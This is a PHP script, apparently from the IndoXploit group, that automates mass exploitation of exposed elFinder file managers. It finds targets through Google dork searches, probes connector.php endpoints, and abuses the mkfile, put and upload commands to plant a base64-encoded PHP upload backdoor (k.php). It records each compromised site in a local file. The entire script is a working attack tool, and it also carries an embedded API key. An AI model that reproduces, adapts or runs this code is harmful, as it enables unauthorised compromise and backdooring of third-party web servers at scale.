<?php
# Tu5b0l3d - IndoXploit
# thx: shor7cut, sohai
# http://indoxploit.blogspot.co.id/2016/03/auto-dorking-exploit-elfinder.html
 
error_reporting(0);
//mulai
$dorks = "/elFinder/files"; // ini dork, bisa diganti
$no=1;
$b = 8;
$total_target =0;
$dork = urlencode($dorks);
$kunAPI = "AIzaSyDYG1FME1N7meBZLcywY7VojMHmtUAUIzY";
$nama_doang = "k.php"; //ini cuma nama
 
$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
 
$decode_isi = base64_decode($isi_nama_doang);
$encode = base64_encode($nama_doang);
 
$fp = fopen($nama_doang,"w");
fputs($fp, $decode_isi);
//end
 
 
function save($data){
        $fp = @fopen("shell_elFinder.htm", "a") or die("cant open file");
        fwrite($fp, $data);
        fclose($fp);
}
 
function ngirim($url, $isi){
$ch = curl_init ("$url");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);
return $data3;
}
 
function elfinder($target, $nama_doang, $url_mkfile, $encode, $decode_isi, $nama_doang, $ini_site){
$url_mkfile = "$target?cmd=mkfile&name=$nama_doang&target=l1_Lw";
$b = file_get_contents("$url_mkfile");
 
 $post1 = array(
                    "cmd" => "put",
                    "target" => "l1_$encode",
                    "content" => "$decode_isi",
                   
                    );
 $post2 = array(
                   
                    "current" => "8ea8853cb93f2f9781e0bf6e857015ea",
                    "upload[]" => "@$nama_doang",
                   
                    );
 
$output_mkfile = ngirim("$target", $post1);
if(preg_match("/$nama_doang/", $output_mkfile)){
    $b = cek_pepes($ini_site, $nama_doang);
    return $b;
}
else{
$upload_ah = ngirim("$target?cmd=upload", $post2);
if(preg_match("/$nama_doang/", $upload_ah)){
    $b = cek_pepes($ini_site, $nama_doang);
    return $b;
}
else{
    $b = "# Upload Failed 2\n";
    return $b;
}
}
}
 
function cek_pepes($target, $nama_doang){
    $aso = "$target/files/$nama_doang";
    echo "# $aso\n";
    $cekk = file_get_contents("$aso");
    if(preg_match("/file/", $cekk)){
        $a = "# Uploaded \n# $aso";
        save("$aso<br>");
        return $a;
    }
    else{
        $a = "# Gagal Upload";
        return $a;
    }
}
 
    for($i=0;$i+=8;$i++){
        echo $i."\n";
$result = file_get_contents("http://ajax.googleapis.com/ajax/services/search/web?v=1.0&hl=iw&rsz=8&q=$dork&key=$kunAPI&start=$i");
$data = json_decode($result, true);
 
if($data['responseStatus']=="200"){
foreach ($data['responseData']['results'] as $key) {
 
$siten = $key['url'];
$explode = explode("files", $siten);
    $ini_site = $explode[0];
    $ini = array("connectors/php/connector.php", "php/connector.php");
    foreach($ini as $path){
        $target = "$ini_site$path";
        echo "# $target\n";
        $cek = file_get_contents("$target");
        $data = json_decode($cek, true);
        $error_ngk = $data['error']['0'];
        $error_cwd = $data['cwd']['name'];
 
        if($error_ngk == ""){
            if($error_cwd == "Home"){
                $b = elfinder($target, $nama_doang, $url_mkfile, $encode, $decode_isi, $nama_doang, $ini_site);
                echo "$b\n\n";
            }
            else{
                echo "- Not Vuln!\n\n";
            }
        }
        else{
            $b = elfinder($target, $nama_doang, $url_mkfile, $encode, $decode_isi, $nama_doang, $ini_site);
            echo "$b\n\n";
        }
            }
 
 
 
    $total_target++;
     flush();
     sleep(1);
   
}
}
else if($data['responseStatus']=="403"){
echo "Suspected Terms of Service Abuse!!! {oww jancokk -_-}\n";
}else if($data['responseStatus']=="400"){
echo "Tidak ada hasil - Scan Done !!!\n";
break;
}
$no++;
}
?>